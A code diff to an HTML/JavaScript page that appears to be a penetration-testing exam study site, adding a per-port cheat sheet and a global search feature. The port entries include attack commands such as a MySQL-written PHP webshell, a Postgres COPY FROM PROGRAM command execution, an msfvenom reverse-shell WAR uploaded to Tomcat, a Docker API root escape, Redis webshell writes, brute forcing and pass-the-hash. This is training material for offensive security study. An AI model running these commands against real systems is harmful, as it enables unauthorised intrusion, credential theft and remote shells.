-    {p:"8080/8443",s:"HTTP-alt / Tomcat",c:"web",d:"Alternate web and application servers.",cmd:["curl -s http://$IP:8080","hydra tomcat /manager/html"],n:"Tomcat manager default creds lead to WAR-upload RCE, Jenkins, dev apps, proxied internals.",ref:"pentesting-web"},
-    {p:"8009",s:"AJP",c:"web",d:"Apache JServ Protocol (Tomcat connector).",cmd:["nmap -p8009 --script ajp-methods $IP"],n:"Ghostcat (CVE-2020-1938) file read and potential RCE.",ref:"8009-pentesting-apache-jserv-protocol-ajp"},
-    {p:"9200",s:"Elasticsearch",c:"db",d:"Search engine and JSON datastore.",cmd:["curl http://$IP:9200/_cat/indices?v","curl http://$IP:9200/_search?pretty"],n:"Unauthenticated data, old-version RCE (CVE-2015-1427), dump indices for creds.",ref:"9200-pentesting-elasticsearch"},
-    {p:"11211",s:"Memcached",c:"db",d:"Memory object cache.",cmd:["nc $IP 11211","stats items"],n:"Unauthenticated data dump, UDP reflection and amplification.",ref:"11211-memcache"},
-    {p:"27017",s:"MongoDB",c:"db",d:"NoSQL document database.",cmd:["mongosh mongodb://$IP","test> show dbs"],n:"Unauthenticated access, dump collections for credentials and flags.",ref:"27017-27018-mongodb"}
+    {p:"3306",s:"MySQL",c:"db",d:"MySQL / MariaDB.",cmd:["mysql -h $IP -u root -p","mysql> show databases; use db; show tables; select * from users;","mysql> select load_file('/etc/passwd');","mysql> select '<?php system($_GET[c]);?>' into outfile '/var/www/html/s.php';"],n:"Weak or empty root password, read files with LOAD_FILE, UDF RCE, creds in application tables.",ref:"pentesting-mysql"},
+    {p:"3389",s:"RDP",c:"windows",d:"Windows Remote Desktop.",cmd:["xfreerdp /u:user /p:pass /v:$IP +clipboard /drive:sh,/tmp","rdesktop -u user -p pass $IP","hydra -L u -P p rdp://$IP"],n:"Weak creds, BlueKeep (CVE-2019-0708), pass-the-hash with restricted admin mode.",ref:"pentesting-rdp"},
+    {p:"5432",s:"PostgreSQL",c:"db",d:"Postgres database.",cmd:["psql -h $IP -U postgres           # add -d dbname if needed","postgres=# \\l    \\c dbname    \\dt    select * from users;","postgres=# CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;   # RCE"],n:"Weak creds, COPY FROM PROGRAM RCE, read local files.",ref:"pentesting-postgresql"},
+    {p:"5900",s:"VNC",c:"remote",d:"Remote desktop.",cmd:["vncviewer $IP::5900","# crack a stored password:  vncpwd passwd.file"],n:"No or weak password, crack the stored VNC password, unauthenticated GUI access.",ref:"pentesting-vnc"},
+    {p:"5985/5986",s:"WinRM",c:"windows",d:"Windows remote management. Instant shell with creds.",cmd:["evil-winrm -i $IP -u user -p pass       # shell","evil-winrm -i $IP -u user -H nthash      # pass-the-hash","#   in shell:  upload local dest   /   download remote local","crackmapexec winrm $IP -u u -p p -x whoami"],n:"Valid creds give a full shell, pass-the-hash, requires Remote Management Users or admin.",ref:"pentesting-winrm"},
+    {p:"6379",s:"Redis",c:"db",d:"In-memory key-value store.",cmd:["redis-cli -h $IP","redis> INFO ; KEYS * ; GET flag","redis> CONFIG GET dir      # then write SSH key / webshell / cron"],n:"Unauthenticated access, write an SSH key, webshell or cron, module-load RCE.",ref:"pentesting-redis"},
+    {p:"6667",s:"IRC",c:"other",d:"Chat relay.",cmd:["nc $IP 6667","# UnrealIRCd backdoor: send AB; <payload> in the banner"],n:"UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075), version-specific exploits.",ref:"pentesting-irc"},
+    {p:"8080/8443",s:"HTTP-alt / Tomcat",c:"web",d:"Alternate web and application servers.",cmd:["curl -s http://$IP:8080/","# Tomcat manager at /manager/html  (try tomcat:s3cret)","msfvenom -p java/jsp_shell_reverse_tcp LHOST=$YOURIP LPORT=443 -f war -o shell.war","curl -u tomcat:s3cret -T shell.war 'http://$IP:8080/manager/text/deploy?path=/x'"],n:"Tomcat manager default creds lead to WAR-upload RCE, Jenkins, dev apps, proxied internals.",ref:"pentesting-web"},
+    {p:"8009",s:"AJP",c:"web",d:"Apache JServ Protocol (Tomcat connector).",cmd:["nmap -p8009 --script ajp-methods $IP","# Ghostcat: read WEB-INF/web.xml via CVE-2020-1938"],n:"Ghostcat (CVE-2020-1938) file read and potential RCE.",ref:"8009-pentesting-apache-jserv-protocol-ajp"},
+    {p:"9200",s:"Elasticsearch",c:"db",d:"Search engine and JSON datastore.",cmd:["curl http://$IP:9200/_cat/indices?v","curl http://$IP:9200/_search?pretty      # dump everything","curl http://$IP:9200/INDEX/_search?pretty"],n:"Unauthenticated data, old-version RCE (CVE-2015-1427), dump indices for creds.",ref:"9200-pentesting-elasticsearch"},
+    {p:"11211",s:"Memcached",c:"db",d:"Memory object cache.",cmd:["nc $IP 11211","stats items","stats cachedump 1 0      # list keys, then: get KEY"],n:"Unauthenticated data dump, UDP reflection and amplification.",ref:"11211-memcache"},
+    {p:"27017",s:"MongoDB",c:"db",d:"NoSQL document database.",cmd:["mongosh mongodb://$IP          # or: mongo $IP","> show dbs ; use admin ; show collections","> db.users.find().pretty()"],n:"Unauthenticated access, dump collections for credentials and flags.",ref:"27017-27018-mongodb"},
+    {p:"137/138",s:"NetBIOS",c:"windows",d:"NetBIOS name service, pairs with SMB.",cmd:["nbtscan $IP","nmblookup -A $IP"],n:"Resolve NetBIOS names and workgroup, feeds into SMB enumeration.",ref:"137-138-139-pentesting-netbios"},
+    {p:"631",s:"IPP / CUPS",c:"other",d:"Printing service and admin panel.",cmd:["curl http://$IP:631","nmap -p631 --script cups-info $IP"],n:"CUPS admin access, info disclosure, recent RCE chain (CVE-2024-47176 family).",ref:"https://www.google.com/search?q=hacktricks+ipp+cups+631+pentesting"},
+    {p:"2375/2376",s:"Docker API",c:"other",d:"Exposed Docker daemon. Frequently instant root.",cmd:["docker -H tcp://$IP:2375 ps","docker -H tcp://$IP:2375 run -v /:/mnt -it alpine chroot /mnt sh"],n:"Unauthenticated Docker API lets you mount the host filesystem and escape to root.",ref:"2375-pentesting-docker"},
+    {p:"5000",s:"Docker Registry / Web",c:"web",d:"Docker registry or a dev web app.",cmd:["curl http://$IP:5000/v2/_catalog","curl http://$IP:5000/v2/IMAGE/tags/list"],n:"Pull images to extract source and secrets, or a Flask/dev app foothold.",ref:"5000-pentesting-docker-registry"},
+    {p:"6000-6009",s:"X11",c:"remote",d:"X Window System server.",cmd:["nmap -p6000 --script x11-access $IP","xwd -display $IP:0 -root -out cap.xwd"],n:"Unauthenticated X access, screenshot the desktop, keylogging.",ref:"6000-pentesting-x11"},
+    {p:"9000",s:"FastCGI / PHP-FPM",c:"web",d:"FastCGI (often PHP-FPM) or a dev service.",cmd:["nmap -p9000 -sV $IP","# FastCGI RCE against PHP-FPM via crafted request"],n:"FastCGI RCE reaching PHP-FPM, or exposed SonarQube/dev services.",ref:"9000-pentesting-fastcgi"},
+    {p:"10000",s:"Webmin",c:"web",d:"Server administration panel.",cmd:["curl -k https://$IP:10000"],n:"Default or weak creds, Webmin RCE (CVE-2019-15107 password_change).",ref:"https://www.google.com/search?q=hacktricks+webmin+10000+pentesting"}
   ];
   var pesc = function(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); };
   var pcatLabel = {web:"Web",windows:"Windows/AD",db:"Database",mail:"Mail",remote:"Remote",file:"File/Share",other:"Other"};
@@ -1447,7 +1504,7 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
         + '<div class="pdesc">'+pesc(p.d)+'</div>'
         + '<div class="code"><pre>'+pesc(p.cmd.join("\n"))+'</pre></div>'
         + '<div class="pnote"><b>Attack vectors</b>'+pesc(p.n)+'</div>'
-        + '<div class="pref"><a href="'+HT+p.ref+'" target="_blank" rel="noopener">HackTricks reference</a></div>'
+        + '<div class="pref"><a href="'+(/^https?:/.test(p.ref)?p.ref:HT+p.ref+"/index.html")+'" target="_blank" rel="noopener">reference</a></div>'
         + '</div>';
     }).join("");
     document.getElementById("portCount").textContent = list.length + " services";
@@ -1473,6 +1530,91 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
     pState.q = e.target.value.toLowerCase().trim(); applyPorts();
   });
   renderPorts(PORTS);
+
+  /* ---------- global search ---------- */
+  function shtml(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+  var SIDX = [];
+  [["home","Home"],["plan","Preparation Plan"],["cheatsheet","Cheat Sheet"],["toolbox","Toolbox"],["ports","Ports"],["boxes","Box Index"],["resources","Resources"]].forEach(function(pg){
+    SIDX.push({ t: pg[1], sub: "jump to page", page: pg[0], text: pg[1].toLowerCase(), badge: "PAGE" });
+  });
+  document.querySelectorAll("#page-cheatsheet .cheat-block, #page-toolbox .cheat-block").forEach(function(b){
+    var page = b.closest(".page").id.replace("page-","");
+    var h = b.querySelector("h3");
+    var title = h ? h.textContent.replace(/\s+/g," ").trim() : b.id;
+    SIDX.push({ t: title, sub: (page==="toolbox" ? "toolbox section" : "cheat sheet section"), page: page, text: b.textContent.toLowerCase(), anchor: b.id, badge: page==="toolbox" ? "TOOL" : "CHEAT" });
+  });
+  PORTS.forEach(function(p){
+    SIDX.push({ t: p.p + "  " + p.s, sub: p.d, page: "ports", text: (p.p+" "+p.s+" "+p.d+" "+p.n+" "+p.cmd.join(" ")).toLowerCase(), port: p.p, badge: "PORT" });
+  });
+  BOXES.forEach(function(b){
+    SIDX.push({ t: b.n, sub: b.focus + " // " + b.src, page: "boxes", text: (b.n+" "+b.focus+" "+b.fh+" "+b.pe+" "+b.src+" "+osLabel(b.os)).toLowerCase(), box: b.n, badge: "BOX" });
+  });
+  document.querySelectorAll("#page-resources .reslist a").forEach(function(a){
+    var d = a.nextElementSibling ? a.nextElementSibling.textContent : "";
+    SIDX.push({ t: a.textContent, sub: d || "resource", page: "resources", text: (a.textContent+" "+d).toLowerCase(), badge: "LINK", href: a.href });
+  });
+
+  var overlay = document.getElementById("searchOverlay");
+  var gInput = document.getElementById("globalSearch");
+  var gResults = document.getElementById("searchResults");
+  var gList = [], gSel = 0;
+  function openSearch(){ overlay.hidden = false; gInput.value = ""; runSearch(""); gInput.focus(); }
+  function closeSearch(){ overlay.hidden = true; }
+  function score(it, q){
+    var t = it.t.toLowerCase();
+    if (t === q) return 0;
+    if (t.indexOf(q) === 0) return 1;
+    if (t.indexOf(q) > -1) return 2;
+    if ((it.sub||"").toLowerCase().indexOf(q) > -1) return 3;
+    if (it.text.indexOf(q) > -1) return 4;
+    return -1;
+  }
+  function runSearch(q){
+    q = q.toLowerCase().trim();
+    if (!q){
+      gList = SIDX.filter(function(x){ return x.badge==="PAGE" || x.badge==="CHEAT" || x.badge==="TOOL"; });
+    } else {
+      gList = SIDX.map(function(it){ return { it: it, s: score(it, q) }; })
+        .filter(function(x){ return x.s >= 0; })
+        .sort(function(a,b){ return a.s - b.s; })
+        .slice(0, 24)
+        .map(function(x){ return x.it; });
+    }
+    gSel = 0; drawResults(q);
+  }
+  function drawResults(q){
+    if (!gList.length){ gResults.innerHTML = '<div class="sr-empty">No matches for "' + shtml(q) + '"</div>'; return; }
+    gResults.innerHTML = gList.map(function(it, i){
+      return '<div class="sr'+(i===gSel?' sel':'')+'" data-i="'+i+'">'
+        + '<div class="sr-main"><div class="sr-t">'+shtml(it.t)+'</div><div class="sr-s">'+shtml(it.sub||"")+'</div></div>'
+        + '<span class="sr-badge">'+it.badge+'</span></div>';
+    }).join("");
+  }
+  function openResult(it){
+    if (!it) return;
+    if (it.href){ window.open(it.href, "_blank", "noopener"); closeSearch(); return; }
+    closeSearch();
+    go(it.page);
+    setTimeout(function(){
+      if (it.anchor){ var el = document.getElementById(it.anchor); if (el) el.scrollIntoView({ behavior: "smooth", block: "start" }); }
+      else if (it.port){ var ps = document.getElementById("portSearch"); if (ps){ ps.value = it.port; ps.dispatchEvent(new Event("input")); } }
+      else if (it.box){ var bs = document.getElementById("boxSearch"); if (bs){ bs.value = it.box; bs.dispatchEvent(new Event("input")); } }
+    }, 80);
+  }
+  function ensureVisible(){ var el = gResults.querySelector(".sr.sel"); if (el) el.scrollIntoView({ block: "nearest" }); }
+  document.getElementById("searchBtn").addEventListener("click", openSearch);
+  gInput.addEventListener("input", function(e){ runSearch(e.target.value); });
+  gResults.addEventListener("click", function(e){ var row = e.target.closest(".sr"); if (row) openResult(gList[+row.getAttribute("data-i")]); });
+  overlay.addEventListener("click", function(e){ if (e.target === overlay) closeSearch(); });
+  document.addEventListener("keydown", function(e){
+    var typing = /^(INPUT|TEXTAREA)$/.test((e.target && e.target.tagName) || "");
+    if (e.key === "/" && !typing && overlay.hidden){ e.preventDefault(); openSearch(); return; }
+    if (overlay.hidden) return;
+    if (e.key === "Escape"){ closeSearch(); }
+    else if (e.key === "ArrowDown"){ e.preventDefault(); gSel = Math.min(gSel+1, gList.length-1); drawResults(gInput.value); ensureVisible(); }
+    else if (e.key === "ArrowUp"){ e.preventDefault(); gSel = Math.max(gSel-1, 0); drawResults(gInput.value); ensureVisible(); }
+    else if (e.key === "Enter"){ e.preventDefault(); openResult(gList[gSel]); }
+  });
 
   /* ---------- page router ---------- */
   var pages = ["home","plan","cheatsheet","toolbox","ports","boxes","resources"];
@@ -1525,5 +1667,3 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
     root.setAttribute("data-theme", cur==="dark" ? "light" : "dark");
   });
 </script>
-</body>
-</html>
